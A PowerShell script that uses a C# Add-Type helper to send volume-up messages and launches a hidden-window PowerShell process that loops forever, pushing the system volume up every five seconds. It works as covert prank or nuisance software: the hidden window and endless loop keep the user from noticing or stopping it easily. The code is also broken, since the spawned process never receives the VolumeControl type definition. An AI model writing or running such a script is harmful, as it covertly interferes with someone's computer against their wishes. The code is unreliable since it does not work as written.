# Add necessary assembly for controlling the system volume
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class VolumeControl {
    [DllImport("user32.dll")]
    public static extern int SendMessageW(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

    public static void IncreaseVolume() {
        // Increase volume by simulating the volume up key multiple times
        for (int i = 0; i < 5; i++) {
            SendMessageW((IntPtr)0xffff, 0x319, (IntPtr)0, (IntPtr)0xA0000);
        }
    }
}
"@

# Create a script block to run the volume control logic
$scriptBlock = {
    try {
        while ($true) {
            # Increase the system volume
            [VolumeControl]::IncreaseVolume()

            # Add a delay to prevent system overload
            Start-Sleep -Seconds 5
        }
    } catch {
        Write-Host "An error occurred: $_"
    }
}

# Start the process with the script block in a hidden window
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -Command & { $($scriptBlock) }"

